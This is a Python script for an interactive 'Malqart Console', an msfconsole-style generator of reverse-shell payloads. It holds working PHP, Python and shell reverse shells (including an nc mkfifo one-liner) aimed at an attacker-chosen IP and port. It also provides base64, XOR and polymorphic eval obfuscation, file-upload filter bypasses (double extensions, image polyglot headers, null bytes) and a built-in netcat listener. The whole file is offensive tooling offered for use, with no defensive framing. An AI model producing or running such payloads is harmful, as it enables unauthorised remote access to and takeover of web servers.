#!/usr/bin/env python3
import os
import subprocess
import base64
import random
import string
import sys

# ========== PAYLOADS & CONFIG ==========
PAYLOAD_TEMPLATES = {
    "php": "<?php $ip='{ip}';$port={port};$s=fsockopen($ip,$port);proc_open('/bin/sh',[['pipe','r'],['pipe','w'],['pipe','w']],$p,$c,null,['environment'=>['TERM'=>'xterm']]); ?>",
    "phtml": "<?php $sock=fsockopen('{ip}',{port});$proc=proc_open('/bin/sh',array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>",
    "png": "<?php $sock=fsockopen('{ip}',{port});proc_open('/bin/sh',array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>",
    "pdf": "<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'); ?>",
    "py": "import socket,subprocess,os;s=socket.socket();s.connect(('{ip}',{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['/bin/sh'])",
    "sh": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
}

OBFUSCATION_NAMES = ["none", "basic", "base64", "xor", "polymorphic"]
BYPASS_NAMES = ["none", "double_extension", "polyglot", "null_byte", "case_manip"]

# ========== OBFUSCATION FUNCTIONS ==========
def obfuscate_none(p): return p
def obfuscate_basic(p):
    var = ''.join(random.choices(string.ascii_letters, k=10))
    clean = p.replace('<?php ', '').replace('?>', '')
    return f"<?php ${var} = '{clean}'; eval(${var}); ?>"
def obfuscate_base64(p):
    clean = p.replace('<?php ', '').replace('?>', '')
    return f"<?php eval(base64_decode('{base64.b64encode(clean.encode()).decode()}')); ?>"
def obfuscate_xor(p):
    key = random.randint(1,255)
    clean = p.replace('<?php ', '').replace('?>', '')
    xored = ''.join(chr(ord(c) ^ key) for c in clean)
    b64 = base64.b64encode(xored.encode()).decode()
    return f"<?php $k={key};$d=base64_decode('{b64}');$s='';for($i=0;$i<strlen($d);$i++){{$s.=chr(ord($d[$i])^$k);}}eval($s);?>"
def obfuscate_polymorphic(p):
    return random.choice([obfuscate_basic, obfuscate_base64, obfuscate_xor])(p)

OBFUSCATION_MAP = {
    "none": obfuscate_none,
    "basic": obfuscate_basic,
    "base64": obfuscate_base64,
    "xor": obfuscate_xor,
    "polymorphic": obfuscate_polymorphic,
}

# ========== BYPASS LOGIC ==========
def apply_bypass(content: str, ext: str, method: str):
    filename = f"shell.{ext}"
    if method == "double_extension":
        filename = f"shell.php.{ext}"
    elif method == "polyglot" and ext in ["png", "jpg", "gif"]:
        magic = {"png": b"\x89PNG\r\n\x1a\n", "jpg": b"\xff\xd8\xff\xe0", "gif": b"GIF89a"}
        header = magic.get(ext, b"")
        content = header.decode("latin1") + content
    elif method == "null_byte":
        filename = f"shell.php%00.{ext}"
    elif method == "case_manip":
        parts = filename.split(".")
        filename = ".".join(p.swapcase() if random.random() > 0.5 else p for p in parts)
    return content, filename

# ========== SESSION STATE ==========
class MalqartSession:
    def __init__(self):
        self.extension = "php"
        self.ip = None
        self.port = 4444
        self.obfuscate = "none"
        self.bypass = "none"
        self.output = None
        self.listener = False

    def show_options(self):
        print("\nModule options:")
        print(f"  EXTENSION   => {self.extension}")
        print(f"  IP          => {self.ip}")
        print(f"  PORT        => {self.port}")
        print(f"  OBFUSCATE   => {self.obfuscate}")
        print(f"  BYPASS      => {self.bypass}")
        print(f"  OUTPUT      => {self.output or 'auto'}")
        print(f"  LISTENER    => {self.listener}\n")

    def generate(self):
        if not self.ip:
            print("[-] IP not set. Use 'set IP <address>'")
            return

        template = PAYLOAD_TEMPLATES.get(self.extension, PAYLOAD_TEMPLATES["php"])
        raw = template.format(ip=self.ip, port=self.port)
        obfuscated = OBFUSCATION_MAP[self.obfuscate](raw)
        content, filename = apply_bypass(obfuscated, self.extension, self.bypass)

        if self.output:
            filename = self.output

        with open(filename, "w") as f:
            f.write(content)
        print(f"[+] Payload saved as: {filename}")

        if self.listener:
            self.start_listener()

    def start_listener(self):
        print(f"[+] Starting listener on port {self.port}...")
        try:
            subprocess.run(["nc", "-nvlp", str(self.port)])
        except FileNotFoundError:
            print("[-] Netcat not found. Start manually with: nc -nvlp", self.port)
        except KeyboardInterrupt:
            print("\n[!] Listener stopped.")

# ========== CONSOLE ==========
def main():
    session = MalqartSession()
    print("Malqart Console v1.0 [msfconsole-style]")
    print("Use 'help' or '?' for commands.\n")

    while True:
        try:
            cmd = input("MalqartShell > ").strip()
            if not cmd:
                continue

            parts = cmd.split()
            action = parts[0].lower()

            if action in ["exit", "quit", "back"]:
                print("[*] Exiting Malqart Console.")
                break

            elif action in ["help", "?"]:
                print("""
Core Commands:
  use <extension>      => Select payload type (e.g., php, png, py)
  set <OPTION> <VAL>   => Set module option (IP, PORT, OBFUSCATE, BYPASS, OUTPUT, LISTENER)
  show options         => Display current settings
  show extensions      => List supported extensions
  show obfuscation     => List obfuscation methods
  show bypass          => List bypass techniques
  run / exploit        => Generate payload
  exit / quit          => Exit console
""")

            elif action == "use":
                if len(parts) < 2:
                    print("[-] Usage: use <extension>")
                    continue
                ext = parts[1].lower()
                if ext in PAYLOAD_TEMPLATES:
                    session.extension = ext
                    print(f"[*] Using payload: {ext}")
                else:
                    print(f"[-] Unsupported extension. Supported: {', '.join(PAYLOAD_TEMPLATES.keys())}")

            elif action == "set":
                if len(parts) < 3:
                    print("[-] Usage: set <OPTION> <VALUE>")
                    continue
                opt = parts[1].upper()
                val = ' '.join(parts[2:])
                if opt == "IP":
                    session.ip = val
                elif opt == "PORT":
                    try:
                        session.port = int(val)
                    except ValueError:
                        print("[-] PORT must be an integer")
                        continue
                elif opt == "OBFUSCATE":
                    if val in OBFUSCATION_NAMES:
                        session.obfuscate = val
                    else:
                        print(f"[-] Invalid obfuscation. Choices: {', '.join(OBFUSCATION_NAMES)}")
                        continue
                elif opt == "BYPASS":
                    if val in BYPASS_NAMES:
                        session.bypass = val
                    else:
                        print(f"[-] Invalid bypass. Choices: {', '.join(BYPASS_NAMES)}")
                        continue
                elif opt == "OUTPUT":
                    session.output = val
                elif opt == "LISTENER":
                    session.listener = val.lower() in ["1", "true", "yes", "on"]
                else:
                    print("[-] Unknown option. Valid: IP, PORT, OBFUSCATE, BYPASS, OUTPUT, LISTENER")
                    continue
                print(f"[*] {opt} => {val}")

            elif action == "show":
                if len(parts) < 2:
                    print("[-] Usage: show [options|extensions|obfuscation|bypass]")
                    continue
                target = parts[1].lower()
                if target == "options":
                    session.show_options()
                elif target == "extensions":
                    print("Supported extensions:")
                    for e in sorted(PAYLOAD_TEMPLATES):
                        print(f"  - {e}")
                elif target == "obfuscation":
                    print("Obfuscation methods:")
                    for m in OBFUSCATION_NAMES:
                        print(f"  - {m}")
                elif target == "bypass":
                    print("Bypass techniques:")
                    for b in BYPASS_NAMES:
                        print(f"  - {b}")
                else:
                    print("[-] Unknown show target")

            elif action in ["run", "exploit"]:
                session.generate()

            else:
                print(f"[-] Unknown command: {action}. Type 'help' for usage.")

        except KeyboardInterrupt:
            print("\n[*] Use 'exit' to quit.")
        except EOFError:
            print("\n[*] Exiting.")
            break

if __name__ == "__main__":
    main()
